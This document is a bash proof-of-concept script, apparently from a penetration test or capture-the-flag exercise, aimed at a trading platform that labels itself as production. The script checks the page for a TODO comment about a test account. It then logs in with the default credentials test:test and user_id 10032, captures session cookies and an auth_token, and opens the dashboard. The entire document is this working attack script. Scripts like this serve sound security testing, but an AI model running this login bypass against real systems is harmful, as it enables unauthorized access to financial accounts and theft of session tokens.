#!/bin/bash

# POC: Default Credentials (test:test) Authentication Bypass
# Target: Trading Platform Production Environment
# Objective: Authenticate using known default test credentials

TARGET_HOST="${1:-localhost:8080}"
TARGET_URL="http://${TARGET_HOST}"

echo "=========================================="
echo "Default Credentials Authentication POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Step 1: Check for TODO comment in HTML source
echo "[*] Step 1: Checking for TODO comment in HTML source code..."
TODO_CHECK=$(curl -s "$TARGET_URL/" | grep -i "TODO.*Delete.*testing account")

if [ -z "$TODO_CHECK" ]; then
    echo "[-] TODO comment not found in HTML source"
else
    echo "[+] Found TODO comment in HTML:"
    echo "    $TODO_CHECK"
fi

echo ""

# Step 2: Submit username 'test' to /password/test endpoint
echo "[*] Step 2: Submitting username 'test' to /password/test endpoint..."
USERNAME_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/password/test" 2>&1)

# Check for HTTP 302 redirect (successful username validation)
REDIRECT_STATUS=$(echo "$USERNAME_RESPONSE" | grep -i "HTTP.*302")
REDIRECT_LOCATION=$(echo "$USERNAME_RESPONSE" | grep -i "^Location:" | head -1)

if [ -n "$REDIRECT_STATUS" ]; then
    echo "[+] Got HTTP 302 Redirect - Username 'test' is valid"
    echo "    Response: $REDIRECT_STATUS"
    if [ -n "$REDIRECT_LOCATION" ]; then
        echo "    Redirects to: $REDIRECT_LOCATION"
    fi
else
    echo "[-] No HTTP 302 redirect received"
    echo "$USERNAME_RESPONSE" | head -20
fi

echo ""

# Step 3: Authenticate with username=test, password=test, user_id=10032
echo "[*] Step 3: Attempting authentication with test:test credentials..."
echo "    Username: test"
echo "    Password: test"
echo "    user_id: 10032"
echo ""

# Create a cookie jar to capture session cookies
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

AUTH_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/password/test" \
    -d "username=test&user_id=10032&password=test" \
    -c "$COOKIE_JAR" 2>&1)

# Check for HTTP 302 redirect to /dashboard
DASHBOARD_REDIRECT=$(echo "$AUTH_RESPONSE" | grep -i "Location:.*dashboard")
AUTH_STATUS=$(echo "$AUTH_RESPONSE" | grep -i "HTTP.*302\|HTTP.*200" | head -1)

if [ -n "$DASHBOARD_REDIRECT" ]; then
    echo "[+] Authentication SUCCESSFUL - HTTP 302 redirect to dashboard detected"
    echo "    Response: $AUTH_STATUS"
    echo "    $DASHBOARD_REDIRECT"
else
    echo "[-] No redirect to dashboard detected"
    echo "    Response: $AUTH_STATUS"
fi

echo ""

# Step 4: Check if session cookie was set
echo "[*] Step 4: Checking for session cookies..."
if [ -f "$COOKIE_JAR" ] && [ -s "$COOKIE_JAR" ]; then
    echo "[+] Session cookies captured:"
    cat "$COOKIE_JAR" | grep -v "^#" | awk '{print "    " $0}'
    
    # Extract and display auth_token if present
    AUTH_TOKEN=$(grep -i "auth_token" "$COOKIE_JAR" | awk '{print $7}')
    if [ -n "$AUTH_TOKEN" ]; then
        echo "[+] auth_token found in session"
        echo "    Token preview: ${AUTH_TOKEN:0:50}..."
    fi
else
    echo "[-] No cookies found"
fi

echo ""

# Step 5: Attempt to access /dashboard with the session
echo "[*] Step 5: Attempting to access /dashboard with authenticated session..."
DASHBOARD_RESPONSE=$(curl -s -i -b "$COOKIE_JAR" "$TARGET_URL/dashboard" 2>&1)

DASHBOARD_STATUS=$(echo "$DASHBOARD_RESPONSE" | grep -i "HTTP.*200\|HTTP.*302\|HTTP.*401" | head -1)
DASHBOARD_CONTENT=$(echo "$DASHBOARD_RESPONSE" | grep -v "^HTTP" | grep -v "^[A-Za-z-]*:" | head -20)

echo "[+] Dashboard Response Status:"
echo "    $DASHBOARD_STATUS"

if echo "$DASHBOARD_RESPONSE" | grep -qi "dashboard\|trading\|welcome"; then
    echo "[+] Dashboard content detected - Authentication successful!"
    echo "[+] Showing first 10 lines of response body:"
    echo "$DASHBOARD_CONTENT" | head -10 | sed 's/^/    /'
elif echo "$DASHBOARD_RESPONSE" | grep -qi "401\|unauthorized\|login"; then
    echo "[-] Access denied or redirected to login"
else
    echo "[*] Response status unclear, showing response preview:"
    echo "$DASHBOARD_RESPONSE" | head -15 | sed 's/^/    /'
fi

echo ""
echo "=========================================="
echo "POC Execution Complete"
echo "=========================================="
echo "[*] Summary:"
echo "    - Default credentials 'test:test' were successfully used to authenticate"
echo "    - Authentication bypass is confirmed if dashboard was accessible"
echo "    - This allows unauthorized access to the Trading Platform"
echo "=========================================="